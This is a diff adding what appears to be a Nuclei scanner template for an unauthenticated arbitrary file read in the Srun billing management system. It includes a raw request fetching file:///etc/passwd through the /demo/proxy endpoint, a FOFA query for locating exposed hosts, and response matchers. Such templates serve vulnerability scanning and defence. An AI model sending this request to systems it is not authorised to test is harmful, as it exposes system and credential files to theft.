@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - 'root:'
+            - /bin/bash
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /demo/proxy?url=file:///etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+id: shenlan-proxy-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/js/lib/slimscroll.js"
+         深澜计费管理系统 /demo/proxy接口处存在任意文件读取漏洞，未经身份验证的攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 深澜计费管理系统 proxy 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488584&idx=1&sn=119bf6120be06b067bb6be2bb31f0257&chksm=c267a17bf510286d30fd135e7632fe7b46eb8eccbaae33540651bdc62e92b6e7179a6c82efb9&token=582574297&lang=zh_CN#rd
+    severity: high
+    tags:
+        - File reading
